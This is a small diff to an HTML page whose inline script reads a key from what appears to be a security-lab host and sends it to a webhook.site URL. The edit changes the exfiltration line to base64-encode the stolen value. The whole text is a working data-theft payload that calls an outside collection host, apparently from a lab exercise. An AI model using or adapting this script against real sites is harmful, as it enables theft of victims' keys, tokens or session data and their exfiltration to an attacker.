@@ -5,7 +5,7 @@
         x.open("GET","https://ptl-b6a1d35f4b5b-70b48580f0bf.libcurl.me/key/0");
         x.send();
         console.log(x.responseText);
-        x.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?test="+x.responseText,true);
+        x.open("GET","https://webhook.site/81894586-c5d3-4409-aaa8-85442faed622?test="+btoa(x.responseText),true);
         x.send();
     </script>
 </body>
